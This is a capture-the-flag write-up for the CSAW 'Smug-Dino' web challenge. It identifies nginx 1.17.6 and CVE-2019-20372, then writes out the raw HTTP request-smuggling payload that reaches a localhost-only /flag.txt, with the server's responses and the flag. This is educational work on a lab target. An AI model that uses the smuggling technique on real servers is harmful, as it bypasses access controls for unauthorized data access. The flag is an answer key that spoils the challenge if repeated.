# Smug-Dino

[toc]

## Description
Don't you know it's wrong to smuggle dinosaurs... and other things?

Author: rollingcoconut

## Solution
This is a WEB category challenge with 50 Points.
When we go to http://web.csaw.io:3009/, we will saw the home page with three Buttons
1. Home
2. Hint
3. Flag?
![home_page](../src/img/smug_dino_homepage.png)


After clicked `Hint` button, we are directed to `http://web.csaw.io:3009/succeed_hint`, the page is asking us to enter the `Server name` & `Server Version` before we can get the hint.
So, let's find them.

Click `F12` enter to the Inspector mode and check for the Network section.
We can get the server's name and version from the Response Header :
```
Server : nginx/1.17.6
```
![response_head](../src/img/server_name_version.png)
We just enter the server's name and version, then we got the Hints

```
HINT: #1

We believe the item you seek is only accessible to localhost clients on the server; 
All other requests to /flag will be processed as a 401. 


It seems the server is issuing 302 redirections to handle 401 erors...
Is it possible to use the redirection somehow to get the localhost flag?



HINT: #2

CVE 2019-....

```

After I do some research on the Internet, I found that this is a vulnerability of CVE-2019-20372 (nginx HTTP request smuggling)


The ways to exploit this vulnerability is to send two request in one time to get the flag.txt that we want.
I am using `Burpsuit` here to exploit :
```
GET / HTTP/1.1
Host: web.csaw.io:3009
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
Content-Length: 4



GET /flag.txt HTTP/1.1
Host: localhost:3009

```
There are three things important in this request raws
First, we need to keep the Connection alive
```
Connection: keep-alive
```
Adding a special request header Connection: Keep-Alive to the HTTP request, telling the server not to close the TCP link after receiving this HTTP request, and to reuse this request for subsequent HTTP requests to the same target server. A TCP link requires only one TCP handshake process, which can reduce server overhead, save resources, and speed up access. Of course, this feature is enabled by default in HTTP 1.1.

Second, we are able to send two requests in one time because for the front-end server it looks like only one request. (Vulnerability)

Third, we need to make sure the host of the second request : `GET /flag.txt HTTP/1.1` to be `localhost:3009` because the web page has been redirected to local.

After that, we can get the flag in the Response :
```
HTTP/1.1 200 OK
Server: nginx/1.17.6
Date: Sat, 16 Sep 2023 13:53:14 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 1952
Connection: keep-alive
X-Powered-By: Express
ETag: W/"7a0-qKx6Ou+8z9np0jE0RYCSKOhMytk"
Set-Cookie: connect.sid=s%3Aram2WsuxHt7YeDgbc2VzFQaWF2pBVEue.mEokkn7jr%2Fj2ayIH4FO%2FNdP%2FxGQH6NyndSfz2xfjjkQ; Path=/; HttpOnly

<!DOCTYPE html>
<html lang="en">

<head>
    <title>All about dinos :) </title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css" integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO" crossorigin="anonymous">
    <link href="css/styles.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css?family=Merriweather:400,700" rel="stylesheet" type="text/css">
</head>

<body>
    <nav class="navbar navbar-dark bg-dark navbar-static-top navbar-expand-md">
        <div class="container">
            <button type="button" class="navbar-toggler collapsed" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1" aria-expanded="false"> <span class="sr-only">Toggle navigation</span>
            </button> <a class="navbar-brand" href="#">Smug Dino</a>
            <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
                <ul class="nav navbar-nav mr-auto">
                    <li class="active nav-item"><a href="/" class="nav-link">Home</a>
                    </li>
                    <li class="nav-item"><a href="/hint" class="nav-link">Hint</a>
                    </li>
                    <li class="nav-item"><a href="/flag" class="nav-link">Flag?</a>
                    </li>
                </ul>
            </div>
        </div>
    </nav>
    <div class="jumbotron">
        <div class="container">
            <h1>What's your favorite dinosuar?</h1>
	    <h5>Ancient artifacts can teach us a lot -- just don't have them in your code!</h5>
	    <div style="max-height:450px; max-width:450px; overflow: hidden">
	        <img src="https://upload.wikimedia.org/wikipedia/commons/4/46/Lambeosaurus_magnicristatus_DB.jpg">
           </div>
            <br>
        </div>
    </div>

</body>
</html>
HTTP/1.1 200 OK
Server: nginx/1.17.6
Date: Sat, 16 Sep 2023 13:53:14 GMT
Content-Type: text/plain
Content-Length: 29
Connection: keep-alive

csawctf{d0nt_smuggl3_Fla6s_!}
```


## Flag
```
csawctf{d0nt_smuggl3_Fla6s_!}
```
